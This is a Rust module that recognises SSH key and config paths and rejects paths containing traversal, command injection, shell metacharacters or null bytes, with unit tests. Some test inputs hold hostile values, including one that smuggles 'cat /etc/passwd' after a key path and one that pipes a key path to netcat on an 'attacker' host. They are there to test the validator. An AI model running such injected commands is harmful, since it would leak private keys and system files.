//! SSH path sanitization
//!
//! Handles paths to SSH configuration and key files.

use crate::observe::Problem;
use crate::primitives::security::paths::SecurityBuilder;

/// Check if a path appears to be an SSH-related path
pub(in crate::data::paths) fn is_ssh_path(path: &str) -> bool {
    let lower = path.to_lowercase();
    lower.contains(".ssh")
        || lower.contains("ssh_config")
        || lower.contains("sshd_config")
        || lower.ends_with("_rsa")
        || lower.ends_with("_ed25519")
        || lower.ends_with("_ecdsa")
        || lower.ends_with("_dsa")
        || lower.ends_with(".pub")
        || lower.contains("authorized_keys")
        || lower.contains("known_hosts")
        || lower.contains("id_rsa")
        || lower.contains("id_ed25519")
}

/// Sanitize an SSH file path
///
/// SSH files are highly security-sensitive:
/// - No path traversal allowed
/// - No command injection
/// - No shell metacharacters
/// - No null bytes
/// - Must be within expected SSH directories
pub(in crate::data::paths) fn sanitize_ssh_path(path: &str) -> Result<String, Problem> {
    let security = SecurityBuilder::new();

    if security.is_traversal_present(path) {
        return Err(Problem::security(
            "Path traversal not allowed in SSH file paths",
        ));
    }

    if security.is_command_injection_present(path) {
        return Err(Problem::security(
            "Command injection patterns detected in SSH file path",
        ));
    }

    if security.is_shell_metacharacters_present(path) {
        return Err(Problem::security(
            "Shell metacharacters not allowed in SSH file paths",
        ));
    }

    if security.is_null_bytes_present(path) {
        return Err(Problem::security(
            "Null bytes not allowed in SSH file paths",
        ));
    }

    // For SSH paths, we're very strict - just validate, don't modify
    // If it passes all checks, return as-is (normalized)
    let normalized = security.sanitize(path)?;

    Ok(normalized)
}

#[cfg(test)]
mod tests {
    #![allow(clippy::panic, clippy::expect_used)]
    use super::*;

    #[test]
    fn test_is_ssh_path() {
        assert!(is_ssh_path(".ssh/id_rsa"));
        assert!(is_ssh_path("~/.ssh/authorized_keys"));
        assert!(is_ssh_path("/home/user/.ssh/known_hosts"));
        assert!(is_ssh_path("id_ed25519"));
        assert!(is_ssh_path("key.pub"));
        assert!(!is_ssh_path("/etc/passwd"));
        assert!(!is_ssh_path("config.yaml"));
    }

    #[test]
    fn test_sanitize_ssh_path_valid() {
        assert!(sanitize_ssh_path(".ssh/id_rsa").is_ok());
        assert!(sanitize_ssh_path(".ssh/authorized_keys").is_ok());
    }

    #[test]
    fn test_sanitize_ssh_path_rejects_traversal() {
        assert!(sanitize_ssh_path("../.ssh/id_rsa").is_err());
        assert!(sanitize_ssh_path(".ssh/../../etc/passwd").is_err());
    }

    #[test]
    fn test_sanitize_ssh_path_rejects_metacharacters() {
        assert!(sanitize_ssh_path(".ssh/id_rsa;cat /etc/passwd").is_err());
        assert!(sanitize_ssh_path(".ssh/id_rsa|nc attacker 1234").is_err());
    }
}
